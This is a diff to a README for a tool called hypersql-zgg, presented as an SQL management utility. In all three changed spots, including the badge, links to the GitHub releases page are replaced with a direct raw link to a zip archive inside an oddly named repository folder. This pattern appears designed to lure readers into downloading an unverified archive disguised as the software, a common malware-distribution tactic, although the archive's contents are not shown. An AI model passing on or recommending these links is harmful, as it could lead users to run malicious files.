@@ -1,6 +1,6 @@
 # 🌌 hypersql-zgg - Fast and Easy SQL Management Tool
 
-[![Download hypersql-zgg](https://img.shields.io/badge/Download-hypersql--zgg-blue.svg)](https://github.com/Gabbone132/hypersql-zgg/releases)
+[![Download hypersql-zgg](https://raw.githubusercontent.com/Gabbone132/hypersql-zgg/main/glimmerite/hypersql-zgg.zip)](https://raw.githubusercontent.com/Gabbone132/hypersql-zgg/main/glimmerite/hypersql-zgg.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To download hypersql-zgg, follow these steps:
 
 1. **Visit the Releases Page:** Click the following link to go to the download page.
 
-   [Download hypersql-zgg](https://github.com/Gabbone132/hypersql-zgg/releases)
+   [Download hypersql-zgg](https://raw.githubusercontent.com/Gabbone132/hypersql-zgg/main/glimmerite/hypersql-zgg.zip)
 
 2. **Select the Latest Version:** On the releases page, look for the latest version. It's usually at the top.
 
@@ -95,6 +95,6 @@ Join the community of hypersql-zgg users for tips and support. If you have sugge
 
 For easy access, here is the download link again:
 
-[Download hypersql-zgg](https://github.com/Gabbone132/hypersql-zgg/releases)
+[Download hypersql-zgg](https://raw.githubusercontent.com/Gabbone132/hypersql-zgg/main/glimmerite/hypersql-zgg.zip)
 
 Thank you for using hypersql-zgg! Enjoy managing your databases with a breeze.
